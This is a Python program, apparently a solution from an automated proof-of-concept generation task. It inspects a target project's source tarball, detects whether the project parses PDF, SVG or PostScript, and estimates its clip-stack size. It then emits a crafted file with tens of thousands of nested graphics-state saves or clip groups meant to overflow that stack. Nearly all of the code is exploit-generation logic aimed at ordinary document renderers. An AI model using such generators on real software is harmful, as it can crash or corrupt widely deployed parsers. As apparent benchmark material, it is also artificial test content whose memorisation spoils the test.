import os
import re
import tarfile
import tempfile
from typing import List, Optional, Tuple


class Solution:
    def _safe_extract_tar(self, tar: tarfile.TarFile, path: str) -> None:
        abs_path = os.path.abspath(path)
        for member in tar.getmembers():
            member_path = os.path.abspath(os.path.join(path, member.name))
            if not member_path.startswith(abs_path + os.sep) and member_path != abs_path:
                continue
            tar.extract(member, path=path)

    def _find_root_dir(self, base: str) -> str:
        entries = [os.path.join(base, p) for p in os.listdir(base)]
        dirs = [p for p in entries if os.path.isdir(p)]
        if len(dirs) == 1:
            return dirs[0]
        return base

    def _iter_source_files(self, root: str, max_size: int = 8 * 1024 * 1024) -> List[str]:
        out = []
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp", ".m", ".mm"}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size <= max_size:
                    out.append(p)
        return out

    def _read_file_prefix(self, path: str, limit: int = 256 * 1024) -> bytes:
        try:
            with open(path, "rb") as f:
                return f.read(limit)
        except OSError:
            return b""

    def _find_fuzzer_files(self, root: str) -> List[str]:
        fuzzers = []
        for p in self._iter_source_files(root):
            b = self._read_file_prefix(p, 512 * 1024)
            if b"LLVMFuzzerTestOneInput" in b:
                fuzzers.append(p)
        return fuzzers

    def _keyword_score(self, data_lc: bytes, keywords: List[bytes]) -> int:
        s = 0
        for kw in keywords:
            if kw in data_lc:
                s += data_lc.count(kw)
        return s

    def _detect_format_and_mode(self, root: str) -> Tuple[str, str]:
        fuzzers = self._find_fuzzer_files(root)
        files_to_scan = fuzzers if fuzzers else self._iter_source_files(root)

        pdf_keywords = [
            b"%pdf", b"pdf", b"poppler", b"mupdf", b"fitz", b"pdfium", b"xpdf",
            b"fz_open_document", b"open_document", b"load_page", b"render_page",
            b"pdf_run", b"pdf_parse", b"pdf_load", b"pdf_document",
        ]
        svg_keywords = [
            b"<svg", b"svg", b"librsvg", b"resvg", b"usvg", b"svgtiny",
            b"clip-path", b"clippath", b"xmlns=\"http://www.w3.org/2000/svg\"",
        ]
        ps_keywords = [
            b"postscript", b"eps", b"gsave", b"grestore", b"setclip", b"clip",
        ]

        pdf_score = 0
        svg_score = 0
        ps_score = 0
        pdf_file_mode_hits = 0
        pdf_stream_mode_hits = 0

        for p in files_to_scan[:200]:
            d = self._read_file_prefix(p, 512 * 1024).lower()
            if not d:
                continue
            pdf_score += self._keyword_score(d, pdf_keywords)
            svg_score += self._keyword_score(d, svg_keywords)
            ps_score += self._keyword_score(d, ps_keywords)

            if b"open_document" in d or b"fz_open_document" in d or b"load_page" in d:
                pdf_file_mode_hits += 1
            if (b"content stream" in d) or (b"parse_content" in d) or (b"run_stream" in d) or (b"process_stream" in d):
                pdf_stream_mode_hits += 1

        fmt = "pdf"
        if svg_score > pdf_score and svg_score >= ps_score:
            fmt = "svg"
        elif ps_score > pdf_score and ps_score > svg_score:
            fmt = "ps"
        else:
            fmt = "pdf"

        mode = "file"
        if fmt == "pdf":
            if pdf_file_mode_hits > 0 and pdf_file_mode_hits >= pdf_stream_mode_hits:
                mode = "file"
            elif pdf_stream_mode_hits > 0:
                mode = "stream"
            else:
                mode = "file"
        return fmt, mode

    def _infer_clip_stack_capacity(self, root: str) -> Optional[int]:
        candidates: List[int] = []
        src_files = self._iter_source_files(root)
        key_re = re.compile(
            r"(clip\s*mark|clip[_\s-]*mark|layer/clip\s*stack|layer[_\s-]*clip[_\s-]*stack|clip[_\s-]*stack|nesting[_\s-]*depth)",
            re.IGNORECASE,
        )

        for p in src_files:
            b = self._read_file_prefix(p, 512 * 1024)
            if not b:
                continue
            try:
                t = b.decode("utf-8", "ignore")
            except Exception:
                continue
            if not key_re.search(t):
                continue

            # Array sizes near "clip stack"
            for m in re.finditer(r"(?:clip|layer)[^;\n]{0,120}(?:stack|Stack)[^;\n]{0,120}\[\s*(\d{1,7})\s*\]", t):
                try:
                    v = int(m.group(1))
                    if 8 <= v <= 1_000_000:
                        candidates.append(v)
                except Exception:
                    pass

            # std::array sizes
            for m in re.finditer(r"(?:clip|layer)[^\n]{0,120}std::array<[^>]*,\s*(\d{1,7})\s*>", t, flags=re.IGNORECASE):
                try:
                    v = int(m.group(1))
                    if 8 <= v <= 1_000_000:
                        candidates.append(v)
                except Exception:
                    pass

            # #define / const int / enum
            for m in re.finditer(
                r"(?:#define|const\s+int|static\s+const\s+int|enum)\s+([A-Za-z_][A-Za-z0-9_]*)[^=\n]{0,80}(?:DEPTH|STACK|NEST|CLIP|LAYER)[A-Za-z0-9_]*[^=\n]{0,80}(?:=)?\s*(\d{1,7})",
                t,
                flags=re.IGNORECASE,
            ):
                name = m.group(1).lower()
                try:
                    v = int(m.group(2))
                except Exception:
                    continue
                if 8 <= v <= 1_000_000:
                    if any(k in name for k in ("depth", "stack", "nest", "clip", "layer")):
                        candidates.append(v)

        if not candidates:
            return None
        # Likely the smallest relevant stack capacity
        candidates.sort()
        return candidates[0]

    def _choose_depth(self, cap: Optional[int]) -> int:
        if cap is None:
            return 80000
        depth = cap * 4 + 256
        if depth < 5000:
            depth = 5000
        if depth > 120000:
            depth = 120000
        return depth

    def _build_pdf_file(self, stream_bytes: bytes) -> bytes:
        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        objects: List[Tuple[int, bytes]] = []
        objects.append((1, b"<< /Type /Catalog /Pages 2 0 R >>"))
        objects.append((2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))
        objects.append((3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> /Contents 4 0 R >>"))
        obj4 = b"<< /Length " + str(len(stream_bytes)).encode("ascii") + b" >>\nstream\n" + stream_bytes + b"\nendstream"
        objects.append((4, obj4))

        out = bytearray()
        out += header
        offsets = {0: 0}
        for obj_id, body in objects:
            offsets[obj_id] = len(out)
            out += str(obj_id).encode("ascii") + b" 0 obj\n"
            out += body
            out += b"\nendobj\n"

        xref_pos = len(out)
        out += b"xref\n"
        out += b"0 " + str(len(objects) + 1).encode("ascii") + b"\n"
        out += b"0000000000 65535 f \n"
        for obj_id, _ in objects:
            off = offsets[obj_id]
            out += f"{off:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n"
        out += b"<< /Size " + str(len(objects) + 1).encode("ascii") + b" /Root 1 0 R >>\n"
        out += b"startxref\n"
        out += str(xref_pos).encode("ascii") + b"\n"
        out += b"%%EOF\n"
        return bytes(out)

    def _build_pdf_stream_only(self, depth: int) -> bytes:
        # Minimal content stream: many saves to grow nesting, then one clip.
        return (b"q\n" * depth) + b"0 0 1 1 re W n\n"

    def _build_svg(self, depth: int) -> bytes:
        # One clipPath, deeply nested groups referencing it.
        # Keep open/close tags compact to avoid huge size blowups.
        # Depth clamped to avoid multi-megabyte XML.
        if depth > 50000:
            depth = 50000
        pre = b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">\n<defs><clipPath id="c"><rect x="0" y="0" width="1" height="1"/></clipPath></defs>\n'
        open_tag = b'<g clip-path="url(#c)">'
        close_tag = b'</g>'
        post = b'\n</svg>\n'
        return pre + (open_tag * depth) + b'<rect x="0" y="0" width="1" height="1"/>' + (close_tag * depth) + post

    def _build_ps(self, depth: int) -> bytes:
        # Basic PostScript-like stream: gsave repeated then one clip.
        if depth > 120000:
            depth = 120000
        # Simple rectangular path then clip; using "newpath ... rectclip" might vary; use path + clip.
        return (b"gsave\n" * depth) + b"newpath 0 0 moveto 1 0 lineto 1 1 lineto 0 1 lineto closepath clip newpath\n"

    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory(prefix="pocgen_") as td:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    self._safe_extract_tar(tf, td)
            except Exception:
                # Fallback: return a PDF-like payload anyway
                depth = 80000
                stream = self._build_pdf_stream_only(depth)
                return self._build_pdf_file(stream)

            root = self._find_root_dir(td)
            fmt, mode = self._detect_format_and_mode(root)
            cap = self._infer_clip_stack_capacity(root)
            depth = self._choose_depth(cap)

            if fmt == "svg":
                return self._build_svg(depth)

            if fmt == "ps":
                return self._build_ps(depth)

            # Default: PDF
            stream = self._build_pdf_stream_only(depth)
            if mode == "stream":
                return stream
            return self._build_pdf_file(stream)